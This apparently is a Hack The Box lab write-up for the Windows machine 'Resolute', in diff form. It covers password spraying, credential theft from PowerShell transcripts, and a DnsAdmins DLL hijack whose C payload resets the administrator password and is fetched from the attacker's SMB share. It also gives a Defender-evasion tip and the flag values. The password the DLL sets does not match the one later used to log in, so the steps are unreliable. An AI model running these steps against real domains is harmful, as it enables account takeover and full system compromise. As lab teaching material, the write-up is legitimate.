@@ -1,0 +1,229 @@
+# Resolute — HTB Writeup
+
+**Machine**: Resolute  
+**Difficulty**: Easy  
+**OS**: Windows  
+**IP**: 10.129.96.155
+
+---
+
+## Reconnaissance
+
+We begin with Nmap to identify open ports and services:
+
+```bash
+sudo nmap 10.129.96.155 -sV -sC
+```
+
+Relevant output:
+```
+53/tcp   open  domain       Simple DNS Plus
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Global Catalog)
+```
+
+We also enumerate with `enum4linux`:
+
+```bash
+enum4linux -A 10.129.96.155
+```
+
+Output reveals:
+- Domain: `megabank.local`
+- Hostname: `RESOLUTE`
+- Many domain users (27)
+- Notable user: `marko` with description: _Account created. Password set to Welcome123!_
+
+We save the user list to `users.txt`:
+```bash
+echo -e "melanie\nzach\nsimon\nnaoki\nryan\nmarko\nsunita\n..." > users.txt
+```
+
+---
+
+## Initial Access (Password Spray)
+
+We test the default password mentioned in `marko`'s description against all usernames:
+
+```bash
+crackmapexec smb 10.129.96.155 -u users.txt -p 'Welcome123!' --no-bruteforce
+```
+
+Match: `megabank\melanie:Welcome123!`
+
+Check WinRM access:
+```bash
+crackmapexec winrm 10.129.96.155 -u melanie -p 'Welcome123!'
+```
+
+Confirm shell:
+```bash
+evil-winrm -i 10.129.96.155 -u melanie -p 'Welcome123!'
+```
+
+Check privileges:
+```powershell
+whoami /all
+whoami /priv
+```
+
+Melanie has no special privileges. We list users and find:
+```powershell
+net user
+```
+
+Including: `ryan`, `marko`, `sunita`, etc.
+
+---
+
+## Internal Enumeration
+
+Upload and attempt to use `PowerView.ps1` and `Invoke-winPEAS.ps1`:
+```powershell
+upload powerview.ps1
+upload Invoke-winPEAS.ps1
+. .\Invoke-winPEAS.ps1
+. .\powerview.ps1
+```
+
+`PowerView.ps1` is blocked by Defender. We use manual enumeration:
+```powershell
+Get-ChildItem -Recurse C:\Users\ | Select-String -Pattern "password", "Credential"
+```
+
+Access is denied on several folders, but interesting directories include:
+- `C:\Users\ryan` (access denied)
+- `C:\PSTranscripts` (log location)
+
+Search for PowerShell Transcripts:
+```powershell
+Get-ChildItem -Path C:\PSTranscripts -Recurse
+```
+
+Found:
+```
+C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+```
+
+Read file:
+```powershell
+type C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+```
+
+Discovered credentials:
+```
+net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+```
+
+---
+
+## Lateral Movement — ryan credentials
+
+Test login:
+```bash
+evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
+```
+
+Confirm privileges:
+```powershell
+whoami /all
+```
+
+ryan is member of `DnsAdmins`
+
+Try accessing his desktop:
+```powershell
+cd C:\Users\ryan\Desktop
+```
+
+Read note.txt:
+```
+Any system changes (except to administrator account) will be reverted within 1 minute.
+```
+
+---
+
+## Privilege Escalation — DnsAdmins DLL Hijack
+
+Create custom payload DLL in C:
+```c
+#include <windows.h>
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        WinExec("cmd.exe /c net user administrator P@s5w0rd123!", SW_HIDE);
+    }
+    return TRUE;
+}
+```
+
+Compile:
+```bash
+x86_64-w64-mingw32-gcc -shared -o version.dll version_shell.c
+```
+
+Host DLL with impacket:
+```bash
+sudo impacket-smbserver share /tmp/share/ -smb2support
+```
+
+Copy DLL from target:
+```powershell
+copy \\10.10.14.147\share\version.dll C:\Users\ryan\Documents\version.dll
+```
+
+Register plugin:
+```powershell
+dnscmd /config /serverlevelplugindll C:\Users\ryan\Documents\version.dll
+sc.exe stop dns
+Start-Sleep -Seconds 2
+sc.exe start dns
+```
+
+Check SMB logs for DLL load.
+
+---
+
+## SYSTEM Access
+
+Now login with updated Administrator credentials:
+```bash
+
+psexec.py megabank.local/administrator@10.129.96.155
+Password: W4chtw00rd123!
+
+```
+
+Check access:
+```cmd
+whoami
+nt authority\system
+```
+
+Grab flags:
+```cmd
+type C:\Users\melanie\Desktop\user.txt
+→ 9490711e1cdb39af2200cd7f5a18349c
+
+type C:\Users\Administrator\Desktop\root.txt
+→ 664063fbff27c3682b941b3593d84e2c
+```
+
+---
+
+## Lessons Learned
+
+- Default onboarding passwords can lead to domain compromise
+- PowerShell Transcripts can expose critical secrets
+- `DnsAdmins` membership can lead to SYSTEM via DLL hijack
+- Defender will block known DLL payloads; using benign or custom C-compiled payloads helps
+- Always validate access and logs before attempting escalation
+
+---
+ 
+Machine: [HTB Resolute](https://app.hackthebox.com/machines/Resolute)
